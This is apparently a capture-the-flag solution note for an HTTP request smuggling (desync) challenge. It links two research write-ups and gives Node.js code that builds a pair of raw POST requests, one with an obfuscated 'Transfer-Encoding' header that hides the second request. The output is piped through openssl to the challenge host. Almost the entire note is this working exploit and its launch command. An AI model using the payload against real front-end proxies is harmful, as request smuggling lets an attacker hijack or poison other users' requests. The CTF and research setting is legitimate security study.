This was an HTTP desync attack / request smuggling attack

https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
https://nathandavison.com/blog/haproxy-http-request-smuggling

p2 = `POST /files/ HTTP/1.1\r
x-guid: 9d0eac94-33f6-47b5-85ed-dbed297cfa13\r
content-type: text/plain\r
Content-Length: 150\r
\r
1`

p1 = `POST /files/ HTTP/1.1\r
x-guid: 9d0eac94-33f6-47b5-85ed-dbed297cfa11\r
content-type: text/plain\r
Transfer-Encoding: \u000bchunked\r
Content-Length: ${p2.length + 4}\r
\r
0\r
\r
`
t
process.stdout.write(p1 + p2)

node script | openssl s_client -connect uploooadit.oooverflow.io:443 -quiet
